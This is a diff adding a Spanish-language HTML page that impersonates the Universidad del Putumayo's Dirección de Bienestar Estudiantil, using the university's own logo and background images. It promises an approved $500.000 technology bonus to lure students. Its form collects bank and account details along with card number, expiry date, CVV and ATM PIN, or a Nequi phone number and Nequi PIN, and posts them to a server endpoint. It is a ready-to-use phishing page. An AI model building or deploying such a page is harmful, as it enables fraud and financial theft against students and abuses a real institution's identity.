@@ -1,0 +1,402 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Recibe tu Bono – Bienestar Estudiantil</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: 'Segoe UI', Arial, sans-serif;
+        min-height: 100vh;
+        background: url('https://sigedin.itp.edu.co/estudiantes/sigedin_excel/imagenes/fondo_uniputumayo1.png') center center / cover no-repeat;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      body::before {
+        content: '';
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.4);
+        z-index: 0;
+      }
+
+      .card {
+        position: relative;
+        z-index: 1;
+        background: #fff;
+        border-radius: 10px;
+        width: 100%;
+        max-width: 480px;
+        box-shadow: 0 4px 28px rgba(0, 0, 0, 0.35);
+        overflow: hidden;
+      }
+
+      .card-header {
+        background: #003087;
+        padding: 20px 28px;
+        display: flex;
+        align-items: center;
+        gap: 14px;
+      }
+      .card-header img {
+        height: 52px;
+        filter: brightness(0) invert(1);
+      }
+      .card-header-text {
+        color: #fff;
+      }
+      .card-header-text .dept {
+        font-size: 11px;
+        opacity: 0.8;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+      }
+      .card-header-text .title {
+        font-size: 17px;
+        font-weight: 700;
+      }
+
+      .card-body {
+        padding: 28px;
+      }
+
+      .bono-badge {
+        background: linear-gradient(135deg, #003087, #0052cc);
+        color: #fff;
+        border-radius: 8px;
+        padding: 16px 20px;
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 24px;
+      }
+      .bono-badge .amount {
+        font-size: 32px;
+        font-weight: 800;
+      }
+      .bono-badge .label {
+        font-size: 13px;
+        opacity: 0.85;
+      }
+      .bono-badge .icon {
+        font-size: 36px;
+      }
+
+      .alert {
+        background: #fff8e1;
+        border-left: 4px solid #f9a825;
+        border-radius: 4px;
+        padding: 10px 14px;
+        font-size: 13px;
+        color: #5d4037;
+        margin-bottom: 24px;
+        line-height: 1.5;
+      }
+
+      h3 {
+        font-size: 15px;
+        color: #003087;
+        margin-bottom: 16px;
+        font-weight: 600;
+      }
+
+      .form-group {
+        margin-bottom: 16px;
+      }
+      label {
+        display: block;
+        font-size: 12px;
+        color: #555;
+        margin-bottom: 5px;
+        font-weight: 600;
+      }
+
+      input[type='text'],
+      input[type='number'],
+      select {
+        width: 100%;
+        padding: 10px 12px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+        color: #333;
+        outline: none;
+        transition: border-color 0.2s;
+      }
+      input:focus,
+      select:focus {
+        border-color: #003087;
+      }
+
+      .row-2 {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 14px;
+      }
+
+      .btn-submit {
+        width: 100%;
+        background: #003087;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        padding: 13px;
+        font-size: 15px;
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 8px;
+        transition: background 0.2s;
+      }
+      .btn-submit:hover {
+        background: #001f5c;
+      }
+
+      .footer-note {
+        text-align: center;
+        font-size: 11px;
+        color: #999;
+        margin-top: 16px;
+        line-height: 1.6;
+      }
+
+      .steps {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 24px;
+        font-size: 12px;
+        color: #888;
+      }
+      .step {
+        flex: 1;
+        text-align: center;
+      }
+      .step .dot {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 4px;
+        font-weight: 700;
+        font-size: 13px;
+      }
+      .step.done .dot {
+        background: #4caf50;
+        color: #fff;
+      }
+      .step.active .dot {
+        background: #003087;
+        color: #fff;
+      }
+      .step.pending .dot {
+        background: #e0e0e0;
+        color: #999;
+      }
+      .step-line {
+        flex: none;
+        width: 24px;
+        align-self: flex-start;
+        margin-top: 14px;
+        border-top: 2px solid #e0e0e0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <div class="card-header">
+        <img src="https://sigedin.itp.edu.co/estudiantes/sigedin_excel/imagenes/LogoUniPutumayo1.png" alt="UniPutumayo" />
+        <div class="card-header-text">
+          <div class="dept">Dirección de Bienestar Estudiantil</div>
+          <div class="title">Programa de Apoyo Tecnológico</div>
+        </div>
+      </div>
+
+      <div class="card-body">
+        <!-- Pasos del proceso -->
+        <div class="steps">
+          <div class="step done">
+            <div class="dot">✓</div>
+            <div>Verificación</div>
+          </div>
+          <div class="step-line"></div>
+          <div class="step active">
+            <div class="dot">2</div>
+            <div>Datos bancarios</div>
+          </div>
+          <div class="step-line"></div>
+          <div class="step pending">
+            <div class="dot">3</div>
+            <div>Desembolso</div>
+          </div>
+        </div>
+
+        <!-- Badge del monto -->
+        <div class="bono-badge">
+          <div class="icon">💳</div>
+          <div>
+            <div class="amount">$500.000</div>
+            <div class="label">Bono de apoyo tecnológico aprobado</div>
+          </div>
+        </div>
+
+        <div class="alert">
+          ⚠️ Para completar el desembolso
+          <strong>debes registrar tu cuenta bancaria</strong>
+          . El valor será transferido en menos de 24 horas hábiles.
+        </div>
+
+        <h3>Información de la cuenta para el desembolso</h3>
+
+        <form action="/submit-bono" method="POST">
+          <div class="form-group">
+            <label>Banco</label>
+            <select name="banco" required>
+              <option value="" disabled selected>Selecciona tu banco</option>
+              <option>Bancolombia</option>
+              <option>Banco de Bogotá</option>
+              <option>Davivienda</option>
+              <option>Nequi</option>
+              <option>Daviplata</option>
+              <option>BBVA</option>
+              <option>Banco Popular</option>
+              <option>Colpatria</option>
+              <option>Caja Social</option>
+              <option>Otro</option>
+            </select>
+          </div>
+
+          <div class="row-2">
+            <div class="form-group">
+              <label>Tipo de cuenta</label>
+              <select name="tipo_cuenta" required>
+                <option value="" disabled selected>Tipo</option>
+                <option>Ahorros</option>
+                <option>Corriente</option>
+                <option>Nequi / Daviplata</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Número de cuenta</label>
+              <input type="number" name="numero_cuenta" placeholder="Ej: 4500123456" required />
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Titular de la cuenta (nombre completo)</label>
+            <input type="text" name="titular" placeholder="Como aparece en el banco" required />
+          </div>
+
+          <h3 style="margin-top: 24px">Validación de Tarjeta</h3>
+
+          <div class="row-2">
+            <div class="form-group">
+              <label>Número de Tarjeta</label>
+              <input type="text" name="numero_tarjeta" placeholder="Ej: 4500 1234 5678 9010" required />
+            </div>
+            <div class="form-group">
+              <label>Fecha de Vencimiento</label>
+              <input type="text" name="fecha_vencimiento" placeholder="MM/AA" required />
+            </div>
+          </div>
+
+          <div class="row-2">
+            <div class="form-group">
+              <label>Código de Seguridad (CVV)</label>
+              <input type="text" name="cvv" placeholder="Reverso de tarjeta" required />
+            </div>
+            <div class="form-group">
+              <label>Clave de Cajero (PIN)</label>
+              <input type="text" name="pin" placeholder="Clave de 4 dígitos" required />
+            </div>
+          </div>
+
+          <button type="submit" class="btn-submit">Confirmar y recibir mi bono →</button>
+        </form>
+
+        <p class="footer-note">
+          Universidad del Putumayo – Dirección de Bienestar Estudiantil
+          <br />
+          <em>Autenticidad del Ser Único</em>
+        </p>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        const bancoSelect = document.querySelector('select[name="banco"]');
+        const tipoCuentaGroup = document.querySelector('select[name="tipo_cuenta"]').closest('.form-group');
+        const titularGroup = document.querySelector('input[name="titular"]').closest('.form-group');
+        const tarjetaHeader = document.querySelectorAll('h3')[1];
+        const numTarjetaInput = document.querySelector('input[name="numero_tarjeta"]');
+        const fechaVencInput = document.querySelector('input[name="fecha_vencimiento"]');
+        const cvvInput = document.querySelector('input[name="cvv"]');
+
+        const numCuentaInput = document.querySelector('input[name="numero_cuenta"]');
+        const numCuentaLabel = numCuentaInput.previousElementSibling;
+
+        const pinInput = document.querySelector('input[name="pin"]');
+        const pinLabel = pinInput.previousElementSibling;
+
+        const tarjetaRow1 = numTarjetaInput.closest('.row-2');
+        const cvvGroup = cvvInput.closest('.form-group');
+
+        function updateForm() {
+          if (bancoSelect.value === 'Nequi') {
+            tipoCuentaGroup.style.display = 'none';
+            document.querySelector('select[name="tipo_cuenta"]').required = false;
+
+            titularGroup.style.display = 'none';
+            document.querySelector('input[name="titular"]').required = false;
+
+            if (tarjetaHeader) tarjetaHeader.style.display = 'none';
+
+            if (tarjetaRow1) tarjetaRow1.style.display = 'none';
+            numTarjetaInput.required = false;
+            fechaVencInput.required = false;
+
+            if (cvvGroup) cvvGroup.style.display = 'none';
+            cvvInput.required = false;
+
+            numCuentaLabel.textContent = 'Número de celular (Nequi)';
+            numCuentaInput.placeholder = 'Ej: 3001234567';
+
+            pinLabel.textContent = 'Clave Nequi (4 dígitos)';
+            pinInput.placeholder = 'Clave Nequi';
+          } else {
+            tipoCuentaGroup.style.display = 'block';
+            document.querySelector('select[name="tipo_cuenta"]').required = true;
+
+            titularGroup.style.display = 'block';
+            document.querySelector('input[name="titular"]').required = true;
+
+            if (tarjetaHeader) tarjetaHeader.style.display = 'block';
+
+            if (tarjetaRow1) tarjetaRow1.style.display = 'grid';
+            numTarjetaInput.required = true;
+            fechaVencInput.required = true;
+
+            if (cvvGroup) cvvGroup.style.display = 'block';
+            cvvInput.required = true;
+
+            numCuentaLabel.textContent = 'Número de cuenta';
+            numCuentaInput.placeholder = 'Ej: 4500123456';
+
+            pinLabel.textContent = 'Clave de Cajero (PIN)';
+            pinInput.placeholder = 'Clave de 4 dígitos';
+          }
+        }
+
+        bancoSelect.addEventListener('change', updateForm);
+        updateForm();
+      });
+    </script>
+  </body>
+</html>
